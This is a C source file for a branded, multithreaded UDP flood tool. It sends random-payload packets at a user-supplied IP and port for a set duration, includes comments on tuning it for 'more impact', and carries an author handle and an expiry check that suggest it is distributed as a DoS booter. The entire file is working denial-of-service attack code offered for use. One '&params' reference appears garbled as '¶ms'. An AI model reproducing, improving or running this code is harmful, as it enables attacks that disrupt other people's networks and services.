#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <fcntl.h>

#define EXPIRATION_YEAR 2026
#define EXPIRATION_MONTH 6
#define EXPIRATION_DAY 30
#define DEFAULT_PACKET_SIZE 1400 // Increased from 999 for more impact
#define DEFAULT_THREAD_COUNT 25  // Optimized for 2 cores
#define SOCKETS_PER_THREAD 3     // 3 sockets per thread = 75 streams

typedef struct {
    char *target_ip;
    int target_port;
    int duration;
    int packet_size;
    int thread_id;
} attack_params;

volatile int keep_running = 1;
volatile unsigned long total_packets_sent = 0;
char *global_payload = NULL;

void handle_signal(int signal) {
    keep_running = 0;
}

void generate_random_payload(char *payload, int size) {
    for (int i = 0; i < size; i++) {
        payload[i] = (rand() % 256);
    }
}

void *udp_flood(void *arg) {
    attack_params *params = (attack_params *)arg;
    int socks[SOCKETS_PER_THREAD];
    int active_sockets = 0;

    // Create multiple sockets per thread
    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[i] >= 0) {
            int flags = fcntl(socks[i], F_GETFL, 0);
            fcntl(socks[i], F_SETFL, flags | O_NONBLOCK);
            active_sockets++;
        }
    }
    if (active_sockets == 0) return NULL;

    struct sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->target_port);
    server_addr.sin_addr.s_addr = inet_addr(params->target_ip);

    time_t end_time = time(NULL) + params->duration;
    unsigned long packets_sent_by_thread = 0;

    while (time(NULL) < end_time && keep_running) {
        for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
            if (socks[i] >= 0) {
                sendto(socks[i], global_payload, params->packet_size, 0, 
                       (struct sockaddr *)&server_addr, sizeof(server_addr));
                __sync_fetch_and_add(&total_packets_sent, 1);
                packets_sent_by_thread++;
            }
        }
    }

    for (int i = 0; i < SOCKETS_PER_THREAD; i++) {
        if (socks[i] >= 0) close(socks[i]);
    }
    return NULL;
}

void display_progress(time_t start_time, int duration) {
    time_t now = time(NULL);
    int remaining = duration - (int)difftime(now, start_time);
    if (remaining < 0) remaining = 0;

    printf("\033[2K\r\033[1;36mTime Left:\033[0m %02d:%02d | \033[1;34mPackets:\033[0m %lu", 
           remaining / 60, remaining % 60, total_packets_sent);
    fflush(stdout);
}

void print_stylish_text() {
    time_t now = time(NULL);
    struct tm expiry_date = {0};
    expiry_date.tm_year = EXPIRATION_YEAR - 1900;
    expiry_date.tm_mon = EXPIRATION_MONTH - 1;
    expiry_date.tm_mday = EXPIRATION_DAY;
    time_t expiry_time = mktime(&expiry_date);

    int remaining_days = (int)(difftime(expiry_time, now) / (60 * 60 * 24));

    printf("\n\033[1;35m╔════════════════════╗\033[0m\n");
    printf("\033[1;35m║ \033[1;32mR O H A N \033[1;35m║\033[0m\n");
    printf("\033[1;35m╠════════════════════╣\033[0m\n");
    printf("\033[1;35m║ \033[1;33mBY: @Rohan2349 \033[1;35m║\033[0m\n");
    printf("\033[1;35m║ \033[1;33mEXPIRY: %d days \033[1;35m║\033[0m\n", remaining_days);
    printf("\033[1;35m╚════════════════════╝\033[0m\n\n");
}

int main(int argc, char *argv[]) {
    print_stylish_text();

    if (argc < 3) {
        printf("\033[1;33mUsage: %s <ip> <port> [duration] [packet_size] [threads]\033[0m\n", argv[0]);
        return EXIT_FAILURE;
    }

    time_t now = time(NULL);
    struct tm *local = localtime(&now);
    if (local->tm_year + 1900 > EXPIRATION_YEAR ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 > EXPIRATION_MONTH) ||
        (local->tm_year + 1900 == EXPIRATION_YEAR && local->tm_mon + 1 == EXPIRATION_MONTH && local->tm_mday > EXPIRATION_DAY)) {
        printf("\033[1;31mExpired. Contact @Rohan2349.\033[0m\n");
        return EXIT_FAILURE;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = (argc > 3) ? atoi(argv[3]) : 60;
    int packet_size = (argc > 4) ? atoi(argv[4]) : DEFAULT_PACKET_SIZE;
    int thread_count = (argc > 5) ? atoi(argv[5]) : DEFAULT_THREAD_COUNT;

    signal(SIGINT, handle_signal);

    global_payload = (char *)malloc(packet_size);
    if (!global_payload) {
        perror("\033[1;31mPayload allocation failed\033[0m");
        return EXIT_FAILURE;
    }
    generate_random_payload(global_payload, packet_size);

    pthread_t threads[thread_count];
    attack_params params[thread_count];
    time_t start_time = time(NULL);

    for (int i = 0; i < thread_count; i++) {
        params[i].target_ip = target_ip;
        params[i].target_port = target_port;
        params[i].duration = duration;
        params[i].packet_size = packet_size;
        params[i].thread_id = i;
        pthread_create(&threads[i], NULL, udp_flood, ¶ms[i]);
    }

    while (keep_running && time(NULL) < start_time + duration) {
        display_progress(start_time, duration);
        usleep(1000000); // 1-second updates
    }

    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n\033[1;32mDone.\033[0m \033[1;34mPackets sent:\033[0m %lu\n", total_packets_sent);
    free(global_payload);
    return 0;
}